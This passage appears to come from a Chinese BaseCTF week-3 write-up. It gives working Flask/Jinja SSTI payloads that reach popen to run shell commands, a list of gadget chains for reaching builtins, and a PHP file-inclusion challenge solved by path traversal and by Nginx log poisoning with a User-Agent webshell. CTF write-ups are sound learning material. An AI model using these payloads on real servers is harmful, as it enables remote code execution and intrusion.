<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908161122847-17260327135688.png" alt="image-20240908161122847"></p>
<p>最终payload</p>
<figure class="highlight twig"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-tag">{%</span> <span class="name">set</span> chr= <span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_buil'</span><span class="string">'tins_'</span><span class="string">'_'</span>][<span class="string">'chr'</span>]<span class="template-tag">%}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">{%</span> <span class="name">set</span> cmd = <span class="string">'cat '</span>~chr(<span class="number">47</span>)~<span class="string">'flag'</span> <span class="template-tag">%}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">{%</span><span class="name">print</span>(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'po'</span><span class="string">'pen'</span>](cmd)[<span class="string">'re'</span><span class="string">'ad'</span>]())<span class="template-tag">%}</span></span><br></pre></td></tr></tbody></table></figure>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908161613163-17260327135685.png" alt="image-20240908161613163" style="zoom:50%;">



<p>为了防止下次还是找不到，这里贴一个找chr函数的链子总结</p>
<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">"".<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[x].<span class="strong">__init__</span>.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].chr</span><br><span class="line">get<span class="emphasis">_flashed_</span>messages.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].chr</span><br><span class="line">url<span class="emphasis">_for.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].chr</span></span><br><span class="line"><span class="emphasis">lipsum.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].chr</span></span><br><span class="line"><span class="emphasis">x.<span class="strong">__init__</span>.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].chr  (x为任意值)</span></span><br></pre></td></tr></tbody></table></figure>



<p>方法二：查看环境变量，通过环境变量中可能存在的根目录来执行rce</p>
<figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%print(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'po'</span><span class="string">'pen'</span>](<span class="string">'env'</span>)[<span class="string">'re'</span><span class="string">'ad'</span>]())%}</span><br></pre></td></tr></tbody></table></figure>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908162224056-17260327135687.png" alt="image-20240908162224056" style="zoom:50%;">

<p>可以看到$OLDPWD=/</p>
<p>我们可以通过这个变量来构造rce语句</p>
<figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%<span class="built_in">print</span>(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'po'</span><span class="string">'pen'</span>](<span class="string">'cd <span class="subst">$OLDPWD</span>;cat flag'</span>)[<span class="string">'re'</span><span class="string">'ad'</span>]())%}</span><br></pre></td></tr></tbody></table></figure>



<p>方法三：</p>
<p>通过expr substr命令来切割环境变量中的字符串</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=`<span class="built_in">pwd</span>`;a=`<span class="built_in">expr</span> substr <span class="variable">$a</span> 1 1`;<span class="built_in">cd</span> <span class="variable">$a</span>;<span class="built_in">ls</span>  </span><br><span class="line"><span class="comment">#expr substr $a [索引位置] [截取长度] 命令中的索引位置是从1开始的，也就是要获取第一个字符需要填入1</span></span><br></pre></td></tr></tbody></table></figure>

<p>本地执行效果</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908163248910-17260327135686.png" alt="image-20240908163248910" style="zoom:50%;">

<p>上payload</p>
<figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%<span class="built_in">print</span>(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'po'</span><span class="string">'pen'</span>](<span class="string">'a=`pwd`;a=`expr substr <span class="subst">$a</span> 1 1`;cd <span class="subst">$a</span>;cat flag'</span>)[<span class="string">'re'</span><span class="string">'ad'</span>]())%}</span><br></pre></td></tr></tbody></table></figure>







<h3 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h3><p>题目源码</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">'incompetent'</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">'Datch'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">'HelloWorld'</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'写出程序员的第一行问候吧！'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">'s'</span>, <span class="string">'e'</span>, <span class="string">'v'</span>, <span class="string">'a'</span>, <span class="string">'n'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'o'</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) {</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) {</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">'php://'</span>, <span class="string">'http://'</span>, <span class="string">'https://'</span>, <span class="string">'ftp://'</span>, <span class="string">'file://'</span> , <span class="string">'data://'</span>, <span class="string">'gopher://'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'此路不通换条路试试?'</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'文件名不合规 请重试'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>分析：</p>
<p>关键代码1</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$required_chars</span> = [<span class="string">'s'</span>, <span class="string">'e'</span>, <span class="string">'v'</span>, <span class="string">'a'</span>, <span class="string">'n'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'o'</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) {  <span class="comment">//循环遍历required_chars中的值，并且赋值给$char</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) {<span class="comment">//检查$char是否在$Datch里</span></span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//若没有则暂停循环</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>关键代码2</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$invalid_patterns</span> = [<span class="string">'php://'</span>, <span class="string">'http://'</span>, <span class="string">'https://'</span>, <span class="string">'ftp://'</span>, <span class="string">'file://'</span> , <span class="string">'data://'</span>, <span class="string">'gopher://'</span>];</span><br><span class="line"><span class="comment">//黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) {<span class="comment">//检查$Datch中是否存在黑明单中的键值</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'此路不通换条路试试?'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>先记录我的思路，感觉像个非预期解（）</p>
<p>由于存在文件包含漏洞，并且要求我们使用$required_chars中的所有字符，我们可以通过构造一条包含其中所有字符的路径来访问flag</p>
<p>本地开一个docker模拟</p>
<p>每个字符对应的目录</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s：sys </span><br><span class="line"></span><br><span class="line">e：etc</span><br><span class="line"></span><br><span class="line">v <span class="selector-tag">a</span> <span class="attribute">r</span> ：  <span class="selector-tag">var</span></span><br><span class="line"></span><br><span class="line">n：mnt</span><br><span class="line"></span><br><span class="line"> <span class="attribute">x</span> ：sys/bus/cxl</span><br><span class="line"></span><br><span class="line">o ：boot</span><br></pre></td></tr></tbody></table></figure>

<p>payload</p>
<figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=..<span class="regexp">/../</span>..<span class="regexp">/sys/</span>bus<span class="regexp">/cxl/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/../</span><span class="keyword">var</span><span class="regexp">/../</span>mnt<span class="regexp">/../</span>boot<span class="regexp">/../</span>flag</span><br></pre></td></tr></tbody></table></figure>

<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908165811164-17260327135689.png" alt="image-20240908165811164"></p>
<p>接下来是预期思路，由于文件包含漏洞中对过滤器做了严格的限制，但是对路径没有限制，所以考虑日志注入</p>
<p>对于Apache，日志存放路径：/var/log/apache/access.log</p>
<p>对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908170549492-172603271356811.png" alt="image-20240908170549492"></p>
<p>Wappalyze看一下中间件是Nginx,post传入参数</p>
<figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></tbody></table></figure>

<p>在U-A处写入一句话木马</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908175642696-172603271356810.png" alt="image-20240908175642696"></p>
<p>不懂为什么在U-A处写马的a参数不用’’包起来，借用bp跑不出来，但是利用hackbar可以，这是什么原因</p>
<h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>题目源码</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"hint.html"</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">'Jail_by.Happy'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">"Do You Like My Jail?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">'/(`|\$|a|c|s|require|include)/i'</span>, <span class="variable">$var</span>)) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) {</span><br><span class="line">    <span 